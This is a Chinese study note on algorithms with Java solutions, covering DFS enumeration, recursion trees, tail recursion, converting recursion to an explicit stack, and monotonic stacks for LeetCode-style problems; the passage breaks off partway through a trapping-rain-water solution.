使用进位\n```java\n// base长度表示节点个数；base的元素表示节点的状态\nint[] base = new int[3];\n\n// 4 * 4 * 4 表示集合元素个数\nfor (int times = 0; times < 4 * 4 * 4; times++) {\n  System.out.println(Arrays.toString(base));\n\n  base[0]++;\n  int i = 0;\n  // 进位操作\n  while (base[i] == 4) {\n    base[i] = 0;\n    i++;\n    if (i != 3) {\n      base[i]++;\n    } else {\n      break;\n    }\n  }\n}\n```\n\n##### 使用dfs\n\n方式一：\n```java\nint[] nodes = new int[3];\ndfs(nodes, 0);\n\n/**\n* nodes：节点集合\n* nowNode: 当前节点\n*/\npublic void dfs(int[] nodes, int nowNode) {\n\n  for (int status = 0; status < 4; status++) {\n    nodes[nowNode] = status;\n    if (nowNode != 2) {\n      dfs(nodes, nowNode + 1);\n    } else {\n      System.out.println(Arrays.toString(nodes));\n    }\n  }\n\n}\n```\n\n方式二:\n```java\nclass Node {\n\n  private String name;\n  private int status;\n\n  public Node(String name) {\n    this.name = name;\n  }\n\n  @Override\n  public String toString() {\n    return status + \"\";\n  }\n\n}\n\nprivate Node A = new Node(\"A\");\nprivate Node B = new Node(\"B\");\nprivate Node C = new Node(\"C\");\nprivate Node[] nodes = new Node[]{A, B, C};\n\n/**\n* nodeIndex: 节点下标\n*/\npublic void dfs(int nodeIndex) {\n  for (int status = 0; status < 4; status++) {\n    nodes[nodeIndex].status = status;\n    if (nodeIndex != 2) {\n      dfs(nodeIndex + 1);\n    } else {\n      System.out.println(Arrays.toString(nodes));\n    }\n  }\n}\n```\n\n## 递归\n### 递归解题套路\n#### 递归树\n由于<font color=\"red\">所有的递归都可以对应到一个**递归树**上，每个节点代表一个栈帧，表示递归函数。</font>\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408161854.png)\n\n1. 按照以上的搜索路线来搜索树时，当节点第一次被碰到时入栈，最后一次碰到时出栈。\n   对应以上图：节点的碰到顺序：1->2->3->2->4->2->1->5->6->5->1\n          节点的入栈顺序：1->2->3->4->5->6\n          节点的出栈顺序：3->4->2->6->5->1\n2. 记录每个节点入栈、出栈时的栈帧之间共享的数据， 以及入栈时的形参值，退栈时的返回值\n3. 指向子节点的有向边对应着代码中子节点入栈前父节点要执行的代码；指向父节点的有向边对应着代码中子节点出栈后父节点要执行的操作。\n\n<font color=\"red\">所以我们在思考如何使用递归时，只需要搞清3件事：</font>\n1. 节点对应的函数\n2. 父子节点之间的关系\n3. 节点不能生成子节点的情况\n\n如果能搞清上述3件事，就能使用递归\n\n#### 题目\n使用以上知识点完成下面三个题目，下面三个题目严格遵循上述知识点\n\n##### 递归实现指数型枚举\n\n- [递归实现指数型枚举](https://www.acwing.com/problem/content/94/)\n\n**题目描述:**\n从 1∼n,这 n个整数中随机选取任意多个，输出所有可能的选择方案。\n输入格式: 输入一个整数 n\n输出格式: 每行输出一种方案。\n同一行内的数必须升序排列，相邻两个数用恰好1个空格隔开。对于没有选任何数的方案，输出空行。\n数据范围: `1≤n≤15`\n输入样例：`3`\n输出样例：\n```\n3\n2\n2 3\n1\n1 3\n1 2\n1 2 3\n```\n\n###### 分析\n\n1. 节点的作用：给定一个数num与一个列表，做2种处理，分别是将这num添加到列表中、不添加到列表中\n2. 父子节点之间的关系： 子节点的num比父节点的num大1\n3. 节点不能生成子节点的情况: 节点的num等于输入的n\n\n当n=3时对应的递归树如下：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408161907.png)\n\n代码:\n```java\npublic class Main{\n\n  private static Integer n = null;\n\n  public static void main(String[] args){\n    initInput();\n    dfs(1, new LinkedList()); \n  }\n\n  public static void initInput(){\n    Scanner scan = new Scanner(System.in); \n    n = scan.nextInt();\n  }\n\n  public static void dfs(int num, List<Integer> ans){\n    if(num == n+1){\n      System.out.println(ans.toString().replace(\"[\", \"\").replace(\"]\", \"\").replace(\",\", \"\"));\n      return;\n    }\n    ans.add(num++);\n    dfs(num, ans);\n    ans.remove(ans.size()-1);\n    dfs(num, ans);\n  }\n}\n```\n\n##### 递归实现组合型枚举\n- [递归实现排列型枚举](https://www.acwing.com/problem/content/96/)\n**题目描述:**\n把 1∼n这 n个整数排成一行后随机打乱顺序，输出所有可能的次序。\n输入格式: 一个整数 n\n输出格式: 按照从小到大的顺序输出所有方案，每行 1个。\n首先，同一行相邻两个数用一个空格隔开。\n其次，对于两个不同的行，对应下标的数一一比较，字典序较小的排在前面。\n数据范围: `1≤n≤9`\n输入样例：`3`\n输出样例：\n```\n1 2 3\n1 3 2\n2 1 3\n2 3 1\n3 1 2\n3 2 1\n```\n\n###### 分析\n1. 节点的作用：将1～n中为被访问到的数字添加或不添加到答案列表中\n2. 父子节点之间的关系：父节点访问了一个数字, 子节点不能再访问这个数字\n3. 节点不能生成子节点的情况:  1～n的数全部被访问\n\n当n=3时对应的递归树如下：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408161919.png)\n\n代码：\n```java\npublic class Main{\n\n  private static Integer n = null;\n  private static boolean[] flag = null; \n\n  public static void main(String[] args){\n    initInput();    \n    flag = new boolean[n+1];\n    dfs(new LinkedList());\n  } \n\n  public static void initInput(){\n    Scanner scan = new Scanner(System.in);\n    n = scan.nextInt(); \n  }\n  \n  public static void dfs(List<Integer> ans){\n    if(ans.size() == n) {\n      System.out.println(ans.toString().replace(\",\", \"\").replace(\"[\", \"\").replace(\"]\", \"\"));\n      return;\n    }\n    for(int i = 1; i <= n; i++){\n      if(!flag[i]){\n        flag[i] = true;\n        ans.add(i);\n        dfs(ans);\n        ans.remove(ans.size()-1);\n        flag[i] = false;\n      }\n    }\n  }\n}\n```\n\n##### 矩阵中的路径\n- [矩阵中的路径](https://leetcode-cn.com/problems/ju-zhen-zhong-de-lu-jing-lcof/)\n给定一个 m x n 二维字符网格 board 和一个字符串单词 word 。如果 word 存在于网格中，返回 true ；否则，返回 false 。\n单词必须按照字母顺序，通过相邻的单元格内的字母构成，其中“相邻”单元格是那些水平相邻或垂直相邻的单元格。同一个单元格内的字母不允许被重复使用。\n例如，在下面的 3×4 的矩阵中包含单词 \"ABCCED\"（单词中的字母已标出）。\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408161931.png)\n\n示例 1：\n输入：board = [[\"A\",\"B\",\"C\",\"E\"],[\"S\",\"F\",\"C\",\"S\"],[\"A\",\"D\",\"E\",\"E\"]], word = \"ABCCED\"\n输出：true\n示例 2：\n输入：board = [[\"a\",\"b\"],[\"c\",\"d\"]], word = \"abcd\"\n输出：false\n\n###### 分析\n1. 节点的作用：判断从当前坐标出发，是否能够找到从index到最后字符的字符串\n2. 父子节点之间的关系：子节点的index比父节点大1\n3. 节点不能生成子节点的情况: index等于目标字符串的长度\n\n对于输入为board = [[\"A\",\"B\",\"D\"],[\"B\",\"C\",\"E\"],[\"D\",\"C\",\"E\"]], word = \"ABDE\"时，递归树为：\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220408161942.png)\n\n代码：\n```java\nclass Solution{\n  private int[] rowDirection = {-1, 1, 0, 0};\n  private int[] columnDirection = {0, 0, -1, 1};\n  \n  public boolean exist(char[][] board, String word){\n    for(int i = 0; i < board.length; i++){\n      for(int j = 0; j < board[0].length; j++){\n        if(board[i][j] == word.charAt(0)){\n          char temp = board[i][j];\n          board[i][j] = '0';\n          if(dfs(board, word, i, j, 1)){\n            return true;\n          }\n          board[i][j] = temp;\n        }\n      }\n    }\n    return false;\n  } \n\n  public boolean dfs(char[][] board, String word, int row, int column, int index){\n    if(index == word.length()){\n      return true;\n    }\n    for(int i = 0; i < 4; i++){\n      int nextRow = row+rowDirection[i];\n      int nextColumn = column+columnDirection[i];\n      if(nextRow >= 0 && nextRow < board.length && nextColumn >= 0 && nextColumn < board[0].length){\n        if(word.charAt(index) == board[nextRow][nextColumn]){\n          index++;\n          char temp = board[nextRow][nextColumn];\n          board[nextRow][nextColumn] = '0';\n          if(dfs(board, word, nextRow, nextColumn, index)){\n            return true;\n          }\n          index--; \n          board[nextRow][nextColumn] = temp;\n        }\n      }\n    }\n    return false;\n  }\n}\n```\n\n### 尾递归\n\n如果一个函数中所有递归形式的调用都出现在函数的末尾，我们称这个递归函数是尾递归的。当递归调用是整个函数体中最后执行的语句且它的返回值不属于表达式的一部分时，这个递归调用就是尾递归。尾递归函数的特点是在回归过程中不用做任何操作，这个特性很重要，因为大多数现代的编译器会利用这种特点自动生成优化的代码。\n#### 原理\n当编译器检测到一个函数调用是尾递归的时候，它就覆盖当前的活动记录而不是在栈中去创建一个新的。编译器可以做到这点，因为递归调用是当前活跃期内最后一条待执行的语句，于是当这个调用返回时栈帧中并没有其他事情可做，因此也就没有保存栈帧的必要了。通过覆盖当前的栈帧而不是在其之上重新添加一个，这样所使用的栈空间就大大缩减了，这使得实际的运行效率会变得更高。\n#### 实例\n为了理解尾递归是如何工作的，让我们再次以递归的形式计算阶乘。首先，这可以很容易让我们理解为什么之前所定义的递归不是尾递归。回忆之前对计算n!的定义：在每个活跃期计算n倍的(n－1)!的值，让n=n－1并持续这个过程直到n=1为止。这种定义不是尾递归的，因为每个活跃期的返回值都依赖于用n乘以下一个活跃期的返回值，因此每次调用产生的栈帧将不得不保存在栈上直到下一个子调用的返回值确定。现在让我们考虑以尾递归的形式来定义计算n!的过程。\n这种定义还需要接受第二个参数a，除此之外并没有太大区别。a（初始化为1）维护递归层次的深度。这就让我们避免了每次还需要将返回值再乘以n。然而，在每次递归调用中，令a=na并且n=n－1。继续递归调用，直到n=1，这满足结束条件，此时直接返回a即可。\n代码实例3-2给出了一个C函数facttail，它接受一个整数n并以尾递归的形式计算n的阶乘。这个函数还接受一个参数a，a的初始值为1。facttail使用a来维护递归层次的深度，除此之外它和fact很相似。读者可以注意一下函数的具体实现和尾递归定义的相似之处。\n示例3-2：以尾递归的形式计算阶乘的一个函数实现\n```cpp\nint facttail(int n, int a)\n{\n    if (n < 0)\n        return 0;    \n    else if (n == 0)\n        return 1;    \n    else if (n == 1)\n        return a;\n    else\n        return facttail(n - 1, n * a);\n}\n```\n示例3-2中的函数是尾递归的，因为对facttail的单次递归调用是函数返回前最后执行的一条语句。在facttail中碰巧最后一条语句也是对facttail的调用，但这并不是必需的。换句话说，在递归调用之后还可以有其他的语句执行，只是它们只能在递归调用没有执行时才可以执行。\n尾递归是极其重要的，不用尾递归，函数的堆栈耗用难以估量，需要保存很多中间函数的堆栈。比如f(n, sum) = f(n-1) + value(n) + sum; 会保存n个函数调用堆栈，而使用尾递归f(n, sum) = f(n-1, sum+value(n)); 这样则只保留后一个函数堆栈即可，之前的可优化删去。\n也许在C语言中有很多的特例，但编程语言不只有C语言，在函数式语言Erlang中（亦是栈语言），如果想要保持语言的高并发特性，就必须用尾递归来替代传统的递归。\n\n# 栈与队列\n## 栈\n### 递归函数转非递归\n首先，递归的本质就是函数调用，我们都知道函数调用是依靠栈来完成，调用函数就入栈，函数结束是出栈。\n\n在 Java 代码中可以自定义一个类来模拟一个栈帧，我们模拟的栈帧必须要含有如下基本信息：\n- 局部变量表：用于存放方法参数和方法内部定义的局部变量。 可以用`HashMap<String, Object>`类型来存储，key为变量名，value为值\n- 方法返回地址: 方法被调用的位置。可以用`int`类型来存储\n- 操作数栈: 在此处只有一个作用，就是用来存放被调用者返回的返回值。可以用`Stack<Object>`类型来存储\n\n#### 模版\n```java\nint dfsBystack(int n) {\n\n  // 定义函数栈\n  Stack<Frame> stack = new Stack();\n\n  // 压入main函数的栈帧, 用于接收main函数中调用这个递归函数后的返回值\n  stack.push(new Frame(new HashMap())); \n\n  // 压入当前函数的栈帧\n  HashMap<String, Integer> locals = new HashMap(); \n  locals.put(\"n\", n);\n  stack.push(new Frame(locals)); \n\n  // 当函数栈中只有main函数栈帧时，退出循环\n  while(stack.size() != 1) {\n\n    // 获取当前函数栈栈顶元素  \n    Frame currentFrame = stack.peek();\n\n    // 将代码定位到方法返回地址处执行相应后续代码\n    if (currentFrame.flag == 0) {\n      ... //\n    } else if (currentFrame.flag == 1) {\n      ... // \n    } \n    ...\n    else {\n      ... //\n    }\n\n  }\n\n  // 将函数栈中的操作数栈的栈顶元素返回\n  return stack.peek().operand.peek();\n\n}\n\nclass Frame {\n  // 局部变量表\n  HashMap<String, Integer> locals; \n\n  // 方法返回地址\n  int flag; \n\n  // 操作数栈\n  Stack<Integer> operand;  \n  \n  public Frame (HashMap<String, Integer> locals) {\n    this.locals = locals;\n    flag = 0;\n    operand = new Stack();\n  }\n  \n}\n```\n\n#### 例子1: 斐波拉契数列\n[斐波拉契数列](https://leetcode.cn/problems/fibonacci-number/)\n\n以斐波拉契数列生成为例，典型的递归版本如下\n```java\nint fibonacci(int n) {\n  if (n == 0 || n == 1) {\n    return 1;\n  } else {\n    return fibonacci(n - 1) + fibonacci(n - 2);\n  }\n}\n```\n\n该函数对于到class字节码文件内容如下：\n```\n 0: iload_0\n 1: ifeq          9\n 4: iload_0\n 5: iconst_1\n 6: if_icmpne     11\n 9: iconst_1           \n10: ireturn\n11: iload_0                           // 把第一个局部变量，即n压入操作数栈\n12: iconst_1                          // 把1(int型)压入操作数栈\n13: isub                              // 将操作数栈栈顶两int类型数弹出进行相减，并将结果压入操作数栈\n14: invokestatic  #2                  // Method fibonacci:(I)I ，会把返回值压入操作数栈\n17: iload_0                           // 把第一个局部变量，即n压入操作数栈 \n18: iconst_2                          // 把2(int型)压入操作数栈\n19: isub                              // 将操作数栈栈顶两int类型数弹出进行相减，并将结果压入操作数栈\n20: invokestatic  #2                  // Method fibonacci:(I)I, 会把返回值压入操作数栈\n23: iadd                              // 将操作数栈栈顶两int类型数弹出并进行相加，并将结果压入操作数栈\n24: ireturn                           // 返回操作数栈栈顶元素\n```\n\n找到其中的方法调用，标记上flag，即方法返回地址标识\n```java\nint fibonacci(int n) {\n  // flag 0 函数入口\n  if (n == 0 || n == 1) {\n    return 1;\n  } else {\n    // 在调用fibonacci(n - 1)后有一个方法返回地址标识，记做flag 1\n    // 在调用fibonacci(n - 2)后有一个方法返回地址标识，记做flag 2\n    return fibonacci(n - 1) + fibonacci(n - 2);\n  }\n}\n```\n\n代码: \n```\nclass Solution {\n  public int fib(int n) {\n    return dfsByStack(n);\n  }\n  \n  int dfsByStack(int n) {\n    Stack<Frame> stack = new Stack();\n    stack.push(new Frame(new HashMap()));\n\n    HashMap<String, Integer> locals = new HashMap(); \n    locals.put(\"n\", n);\n    stack.push(new Frame(locals));\n\n    while(stack.size() != 1) {\n      Frame currentFrame = stack.peek();\n      // 将代码定位到方法返回地址处\n      if (currentFrame.flag == 0) {\n        if (currentFrame.locals.get(\"n\") == 0 || currentFrame.locals.get(\"n\") == 1) {\n          stack.pop();\n          stack.peek().operand.push(currentFrame.locals.get(\"n\"));\n        } else {\n           locals = new HashMap(); \n           locals.put(\"n\", currentFrame.locals.get(\"n\") - 1);\n           Frame nextFrame = new Frame(locals);\n           stack.push(nextFrame);\n           currentFrame.flag = 1;\n        }\n      } else if (currentFrame.flag == 1) {\n        locals = new HashMap(); \n        locals.put(\"n\", currentFrame.locals.get(\"n\") - 2);\n        Frame nextFrame = new Frame(locals);\n        stack.push(nextFrame);\n        currentFrame.flag = 2;\n      } else if (currentFrame.flag == 2) {\n        int returnValue = currentFrame.operand.push(currentFrame.operand.pop() + currentFrame.operand.pop());\n        stack.pop();\n        stack.peek().operand.push(returnValue);\n      }\n    }\n\n    return stack.peek().operand.peek();\n  }\n\n  class Frame {\n    HashMap<String, Integer> locals; // 局部变量表\n    int flag; // 方法返回地址\n    Stack<Integer> operand;  // 操作数栈\n    \n    public Frame (HashMap<String, Integer> locals) {\n      this.locals = locals;\n      flag = 0;\n      operand = new Stack();\n    }\n  }\n}\n```\n\n#### 例子2: 二叉树的中序遍历\n[二叉树的中序遍历](https://leetcode.cn/problems/binary-tree-inorder-traversal/)\n\n代码：\n```java\nclass Solution {\n\n  List<Integer> ans = new ArrayList();\n\n  public List<Integer> inorderTraversal(TreeNode root) {\n    dfsByStack(root);\n    return ans;\n  }\n  \n  void dfsByStack(TreeNode root) {\n    Stack<Frame> stack = new Stack();\n    stack.push(new Frame(new HashMap()));\n\n    HashMap<String, TreeNode> locals = new HashMap();\n    locals.put(\"root\", root);\n    stack.push(new Frame(locals));\n\n    while (stack.size() != 1) {\n      Frame currentFrame = stack.peek();\n      if (currentFrame.flag == 0) {\n        if (currentFrame.locals.get(\"root\") == null) {\n          stack.pop();\n        } else {\n          locals = new HashMap();\n          locals.put(\"root\", currentFrame.locals.get(\"root\").left);\n          stack.push(new Frame(locals));\n          currentFrame.flag = 1;\n        }\n      } else if (currentFrame.flag == 1) {\n        ans.add(currentFrame.locals.get(\"root\").val);\n        locals = new HashMap();\n        locals.put(\"root\", currentFrame.locals.get(\"root\").right);\n        stack.push(new Frame(locals));\n        currentFrame.flag = 2;\n      } else {\n        stack.pop();\n      }\n    }\n    \n  }\n\n  class Frame {\n    HashMap<String, TreeNode> locals;\n    int flag;\n    \n    public Frame (HashMap<String, TreeNode> locals) {\n      this.locals = locals;\n      flag = 0;\n    }\n  }\n}\n```\n\n### 栈在表达式求值中的应用\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220524194225.png)\n\n#### 例题1: 逆波兰表达式求值\n[逆波兰表达式求值](https://leetcode.cn/problems/evaluate-reverse-polish-notation/)\n\n根据 逆波兰表示法，求表达式的值。\n\n有效的算符包括 `+、-、*、/` 。每个运算对象可以是整数，也可以是另一个逆波兰表达式。\n\n注意 两个整数之间的除法只保留整数部分。\n\n可以保证给定的逆波兰表达式总是有效的。换句话说，表达式总会得出有效数值且不存在除数为 0 的情况。\n\n\n示例 1：\n```txt\n输入：tokens = [\"2\",\"1\",\"+\",\"3\",\"*\"]\n输出：9\n解释：该算式转化为常见的中缀算术表达式为：((2 + 1) * 3) = 9\n```\n\n\n```java\nclass Solution {\n  public int evalRPN(String[] tokens) {\n    Stack<Integer> operand = new Stack();\n\n    for (String token : tokens) {\n      if (token.equals(\"+\")) {\n        operand.push(operand.pop() + operand.pop());\n      }else if (token.equals(\"-\")) {\n        operand.push(-1 * operand.pop() + operand.pop());\n      }else if (token.equals(\"*\")) {\n        operand.push(operand.pop() * operand.pop());\n      }else if (token.equals(\"/\")) {\n        operand.push((int)(1.0 / operand.pop() * operand.pop()));\n      } else {\n        operand.push(Integer.valueOf(token));\n      }\n    }\n\n    return operand.peek();\n  }\n}\n```\n\n### 用栈实现队列\n例题： [用栈实现队列](https://leetcode.cn/problems/implement-queue-using-stacks/)\n\n分析：https://leetcode.cn/problems/implement-queue-using-stacks/solution/yong-zhan-shi-xian-dui-lie-by-leetcode/\n\n代码：\n```java\nclass MyQueue {\n\n  Stack<Integer> stack1; \n  Stack<Integer> stack2;\n\n  public MyQueue() {\n    stack1 = new Stack();\n    stack2 = new Stack();\n  }\n  \n  public void push(int x) {\n    while (!stack1.isEmpty()) {\n      stack2.push(stack1.pop());\n    }\n    stack1.push(x);\n    while (!stack2.isEmpty()) {\n      stack1.push(stack2.pop());\n    }\n  }\n  \n  public int pop() {\n    return stack1.pop();\n  }\n  \n  public int peek() {\n    return stack1.peek();\n  }\n  \n  public boolean empty() {\n    return stack1.isEmpty();\n  }\n}\n```\n\n\n## 单调栈\n单调栈是一种特殊的栈。栈本来就是一种受限的数据结构了，单调栈在此基础上又受限了一次（受限++）。即要往栈中添加数据A时，要先判断添加数据A后，是否影响了单调性，若影响了则弹出栈顶元素，直到插入数据A后不会影响栈的单调性后，再插入数据A。\n\n单调递增栈：栈顶到栈底，元素单调递增\n单调递减栈：栈顶到栈底，元素单调递减\n\n比如：\n```txt\n \\  9  /      \\  1  /\n |  7  |      |  3  |\n |  5  |      |  5  |\n |  3  |      |  7  |\n |  2  |      |  9  |\n -------      -------\n单调递减栈     单调递增栈\n```\n\n### 适用场景一\n给一个数组或序列，如果想要知道每个元素的右边第一个比它大（小）的元素是哪个。如果用暴力算法来做的话，复杂度是O(n^2)。而使用单调栈可以将复杂度降到只有O(n); 这是单调栈的主要应用场景。 具体过程如下：\n\n当给一个数组或序列，如果想要知道每个元素的右边第一个比它大（小）的元素是哪个，则我们可以从数组右边界开始往左遍历，将这些元素插入单调递增栈（单调递减栈）中。往单调递增栈（单调递减栈）中插入元素时，可以先需要弹出一些元素，因为要使得元素插入后，依然是单调递增栈（单调递减栈）。在弹出一些元素后，如果此时元素可以插入了，那么此时栈顶元素就是要插入元素的右边第一个比它大（小）的元素。\n\n因为是要知道一个元素A的右边第一个比它大（小）的元素是哪个，所以我们肯定是要先遍历到这个元素A的右边，从而我们是从数组的右边界开始往左遍历。又因为A元素右边第一个比它大（小）的元素B一定是先到栈底，而且元素A插入栈时元素B是没有弹出来的，即后入栈的元素A小于（大于）现入栈的B，所以我们需要维护的是单调递增栈（单调递减栈）\n\n例子：现在有一个数组`[2,1,2,4,3]`, 我先需要知道该数组中的每个元素的左边第一个比它大的元素是哪个? 我们从数组右边界开始往左遍历，维护一个单调递增栈。然后维护一个res数组，这个数组就是存储`[2,1,2,4,3]`数组中的每个元素的左边第一个比它大的元素是哪个。 过程如下：\n\n|第i步|操作|单调栈(栈顶->栈底)|res数组|\n|--|--|--|--|\n|1|3进栈|3|[0,0,0,0,-1]|\n|2|3出栈，4进栈|4|[0,0,0,-1,-1]|\n|3|2进栈|2->4|[0,0,4,-1,-1]|\n|4|1进栈|1->2->4|[0,2,4,-1,-1]|\n|5|1,2出栈，2进栈|2->4|[4,2,4,-1,-1]|\n\n所以最终`res=[4,2,4,-1,-1]`\n\n#### 模版\n**获取右边第一个更大元素的元素值**\n```java\nint[] rightFirstGreater(int[] nums) {\n  int[] res = new int[nums.length];\n  Stack<Integer> stack = new Stack(); \n  for (int i = nums.length - 1; i >= 0; i--) {\n    while (!stack.isEmpty() && nums[i] >= stack.peek()) {\n      stack.pop();\n    }\n    res[i] = stack.isEmpty() ? -1 : stack.peek(); \n    stack.push(nums[i]);\n  }\n  return res;\n}\n```\n\n**获取右边第一个更大元素的下标**, 见例题2\n```java\nint[] rightFirstGreater(int[] nums) {\n  int[] res = new int[nums.length];\n  Stack<Integer> stack = new Stack();\n  for (int i = nums.length - 1; i >= 0; i--) {\n    while (!stack.isEmpty() && nums[i] >= nums[stack.peek()]) {\n      stack.pop();\n    }\n    res[i] = stack.isEmpty() ? -1 : stack.peek();\n    stack.push(i);\n  }\n  return res;\n}\n```\n\n#### 例题1: 下一个更大元素 I\n[下一个更大元素 I](https://leetcode.cn/problems/next-greater-element-i/)\n\nnums1 中数字 x 的 下一个更大元素 是指 x 在 nums2 中对应位置 右侧 的 第一个 比 x 大的元素。\n\n给你两个 没有重复元素 的数组 nums1 和 nums2 ，下标从 0 开始计数，其中nums1 是 nums2 的子集。\n\n对于每个 0 <= i < nums1.length ，找出满足 nums1[i] == nums2[j] 的下标 j ，并且在 nums2 确定 nums2[j] 的 下一个更大元素 。如果不存在下一个更大元素，那么本次查询的答案是 -1 。\n\n返回一个长度为 nums1.length 的数组 ans 作为答案，满足 ans[i] 是如上所述的 下一个更大元素 。\n\n示例 1：\n```txt\n输入：nums1 = [4,1,2], nums2 = [1,3,4,2].\n输出：[-1,3,-1]\n解释：nums1 中每个值的下一个更大元素如下所述：\n- 4 ，用加粗斜体标识，nums2 = [1,3,4,2]。不存在下一个更大元素，所以答案是 -1 。\n- 1 ，用加粗斜体标识，nums2 = [1,3,4,2]。下一个更大元素是 3 。\n- 2 ，用加粗斜体标识，nums2 = [1,3,4,2]。不存在下一个更大元素，所以答案是 -1 。\n```\n\n示例 2：\n```txt\n输入：nums1 = [2,4], nums2 = [1,2,3,4].\n输出：[3,-1]\n解释：nums1 中每个值的下一个更大元素如下所述：\n- 2 ，用加粗斜体标识，nums2 = [1,2,3,4]。下一个更大元素是 3 。\n- 4 ，用加粗斜体标识，nums2 = [1,2,3,4]。不存在下一个更大元素，所以答案是 -1 。\n```\n\n代码：\n```java\nclass Solution {\n  public int[] nextGreaterElement(int[] nums1, int[] nums2) {\n    int[] res = rightFirstGreater(nums2);\n    int[] ans = new int[nums1.length];\n    for (int i = 0; i < nums1.length; i++) {\n      for (int j = 0; j < nums2.length; j++) {\n        if (nums1[i] == nums2[j]) {\n          ans[i] = res[j];\n        }\n      }\n    }\n    return ans;\n  }\n  \n  int[] rightFirstGreater(int[] nums) {\n    int[] res = new int[nums.length];\n    Stack<Integer> stack = new Stack(); \n    for (int i = nums.length - 1; i >= 0; i--) {\n      while (!stack.isEmpty() && nums[i] >= stack.peek()) {\n        stack.pop();\n      }\n      res[i] = stack.isEmpty() ? -1 : stack.peek(); \n      stack.push(nums[i]);\n    }\n    return res;\n  }\n}\n```\n\n#### 例题2: 每日温度\n[每日温度](https://leetcode.cn/problems/daily-temperatures/)\n\n给定一个整数数组 temperatures ，表示每天的温度，返回一个数组 answer ，其中 answer[i] 是指在第 i 天之后，才会有更高的温度。如果气温在这之后都不会升高，请在该位置用 0 来代替。\n\n示例 1:\n```java\n输入: temperatures = [73,74,75,71,69,72,76,73]\n输出: [1,1,4,2,1,1,0,0]\n```\n\n代码：\n```java\nclass Solution {\n  public int[] dailyTemperatures(int[] temperatures) {\n    int[] nextGreaterElement = rightFirstGreater(temperatures); \n    int[] ans = new int[temperatures.length];\n    for (int i = 0; i < nextGreaterElement.length; i++) {\n      if (nextGreaterElement[i] == -1) {\n        ans[i] = 0;\n      } else {\n        ans[i] = nextGreaterElement[i] - i;\n      }\n    }\n    return ans;\n  }\n\n  int[] rightFirstGreater(int[] nums) {\n    int[] res = new int[nums.length];\n    Stack<Integer> stack = new Stack();\n    for (int i = nums.length - 1; i >= 0; i--) {\n      while (!stack.isEmpty() && nums[i] >= nums[stack.peek()]) {\n        stack.pop();\n      }\n      res[i] = stack.isEmpty() ? -1 : stack.peek();\n      stack.push(i);\n    }\n    return res;\n  }\n\n}\n```\n\n#### 例题3: 链表中的下一个更大节点\n[链表中的下一个更大节点](https://leetcode.cn/problems/next-greater-node-in-linked-list/)\n\n给定一个长度为 n 的链表 head\n\n对于列表中的每个节点，查找下一个 更大节点 的值。也就是说，对于每个节点，找到它旁边的第一个节点的值，这个节点的值 严格大于 它的值。\n\n返回一个整数数组 answer ，其中 answer[i] 是第 i 个节点( 从1开始 )的下一个更大的节点的值。如果第 i 个节点没有下一个更大的节点，设置 answer[i] = 0 。\n\n代码：\n```java\n/**\n * Definition for singly-linked list.\n * public class ListNode {\n *     int val;\n *     ListNode next;\n *     ListNode() {}\n *     ListNode(int val) { this.val = val; }\n *     ListNode(int val, ListNode next) { this.val = val; this.next = next; }\n * }\n */\nclass Solution {\n  public int[] nextLargerNodes(ListNode head) {\n    List<Integer> numsList = new ArrayList();\n    ListNode p = head;\n    while (p != null) {\n      numsList.add(p.val);\n      p = p.next;\n    }\n    Integer[] nums = numsList.toArray(new Integer[numsList.size()]);\n    return rightFirstGreater(nums);\n  }\n\n  int[] rightFirstGreater(Integer[] nums) {\n    int[] res = new int[nums.length];\n    Stack<Integer> stack = new Stack();\n    for (int i = nums.length - 1; i >= 0; i--) {\n      while (!stack.isEmpty() && nums[i] >= stack.peek()) {\n        stack.pop();\n      }\n      res[i] = stack.isEmpty() ? 0 : stack.peek();\n      stack.push(nums[i]);\n    }\n    return res;\n  }\n  \n}\n```\n\n#### 例题4: 接雨水\n[接雨水](https://leetcode.cn/problems/trapping-rain-water/)\n\n给定 n 个非负整数表示每个宽度为 1 的柱子的高度图，计算按此排列的柱子，下雨之后能接多少雨水。\n\n\n##### 分析\n\n<div class=\"container\">\n  <iframe width=\"560\" height=\"315\" src=\"https://www.youtube.com/embed/x9uvA-Rd1vI\" title=\"YouTube video player\" frameborder=\"0\" allow=\"accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture\" allowfullscreen></iframe>\n</div>\n\n![](https://raw.githubusercontent.com/NaisWang/images/master/20220526143029.png)\n\n过程：\n- 第2块：左边没有比它高的柱子，跳过\n- 第3块：左边第一个比它高的柱子为第2块，高度为1；右边第一个不比它矮的柱子左边第一个比它高的柱子为第2块，高度为1；右边第一个不比它矮的柱子为第4块，高度为2；所以可以积水`（(min(2, 1) - 0) * （4 - 2 - 1））= 1`\n- 第4块：左边没有比它高的柱子，跳过\n- 第5块：左边第一个比它高的柱子为第4块，高度为2；但是右边存在一个不比它矮的柱子为第7块，且高度相等，所以第5块与第7块的积水范围是同一范围，为了避免重复计算，可以把第5块的积水放在计算第7块的积水上\n- 第6块：左边第一个比它高的柱子为第5块，高度为1；右边第一个不比它矮的柱子为第7块，高度为1；所以可以积水`（(min(1, 1) - 0 )* (7 - 5 - 1)） = 1`\n- 第7块：左边第一个比它高的柱子为第4块，高度为2；右边第一个不比它矮的柱子为第8块，高度为3；所以可以积水`（(min(2, 3) - 1) * (8 - 4 - 1)） = 3`\n- 第8块：左边没有比它高的柱子，跳过\n- 第9块：左边第一个比它高的柱子为第8块，高度为3；但是右边存在一个不比它矮的柱子为第11块，且高度相等，所以第9块与第11块的积水范围是同一范围，为了避免重复计算，可以把第9块的积水放在计算第11块的积水上\n- 第10块：左边第一个比它的柱子为第9块，高度为2；右边第一个不比它矮的柱子为第11块，高度为2；所以可以积水`（(min(2, 2) - 1) * (11 - 9 - 1)）= 1`\n- 第11块：右边不存在一个不比它矮的柱子，跳过\n\n所以一共可以积水：1 + 1 + 3 + 1 = 6\n\n代码：\n```java\nclass Solution {\n  public int trap(int[] height) {\n    int[] res = rightFirstGreater(height);\n    int[] resReverse = leftFirstGreater(height);\n    int ans = 0;\n    for (int i = 1; i < height.length - 1; i++) {\n      if (res[i] != -1 && resReverse[i] != -1 && height[i] != height[res[i]]) {\n        ans += (Math.min(height[res[i]], height[resReverse[i]]) - height[i]) * (res[i] - resReverse[i] - 1);\n      }\n    } \n    return ans;\n  